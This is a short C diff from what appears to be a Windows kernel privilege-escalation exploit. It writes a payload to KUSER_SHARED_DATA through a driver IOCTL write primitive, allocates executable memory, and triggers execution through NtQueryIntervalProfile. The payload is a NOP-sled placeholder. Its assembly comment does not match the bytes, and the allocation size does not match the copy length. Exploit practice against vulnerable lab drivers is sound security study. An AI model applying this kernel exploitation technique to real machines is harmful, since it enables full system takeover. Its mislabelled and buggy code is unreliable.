@@ -294,12 +294,20 @@ bool ExecuteShellcodeByNtQueryIntervalProfile()
 
 void *GenerateShellCode(HANDLE driverHandle)
 {
-    void *ptr = NULL;
     int shellCodeLen=0;
+    void *shellcode=NULL;
+    const unsigned char fakepayload[] = {
+        "\x90\x90\x90\x90\x90\x90\x90\x90\xC3"              // mov rax,[gs:0x188]  ; Current thread (KTHREAD)
+    } ;
     
     printf("[+] Shellcode is located at %p\n",KUSER_SHARED_DATA );
 
-    SendToDriver(driverHandle,0x0022200B,(void*)KUSER_SHARED_DATA,(void*)0x909090C3);
+
+    shellcode= VirtualAlloc(0,sizeof(void*), 0x3000,0x40); 
+
+    RtlMoveMemory(shellcode,fakepayload,strlen(fakepayload));
+
+    SendToDriver(driverHandle,0x0022200B,(void*)KUSER_SHARED_DATA, shellcode);
 
     return (void*) KUSER_SHARED_DATA;
 }
